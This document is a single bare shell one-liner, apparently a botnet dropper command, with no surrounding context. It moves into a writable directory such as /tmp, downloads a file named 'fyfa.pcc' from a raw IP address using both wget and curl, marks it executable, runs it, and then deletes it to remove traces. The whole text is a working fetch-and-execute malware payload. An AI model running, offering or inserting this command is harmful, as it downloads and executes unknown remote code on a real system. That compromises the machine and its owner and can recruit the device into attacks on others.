cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://50.115.166.187/fyfa.pcc; curl -O http://50.115.166.187/fyfa.pcc; chmod +x fyfa.pcc; ./fyfa.pcc; rm -rf fyfa.pcc
